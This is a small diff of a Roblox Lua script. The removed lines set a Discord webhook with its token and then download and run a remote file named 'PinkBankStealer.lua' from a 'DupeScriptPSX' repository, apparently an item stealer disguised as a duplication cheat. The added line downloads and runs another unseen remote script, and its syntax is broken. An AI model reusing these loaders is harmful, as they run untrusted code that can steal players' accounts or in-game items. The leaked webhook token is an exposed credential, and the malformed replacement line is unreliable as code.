@@ -1,5 +1,1 @@
-_G.Webhook = "https://discordapp.com/api/webhooks/1084225446805258432/42LMdCJyR0bU14QSAk1cKjf8v99LW3Nag56pbp6VZQgOzWiZlss9FybVfuMH7mxx2Z8V"
-_G.LoadingText = "Load..."
-_G.UserId = your userid!
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
+loadstring(game:httpget("https://raw.githubusercontent.com/Gxganox/test/main/script%20adopte%20me"))[];
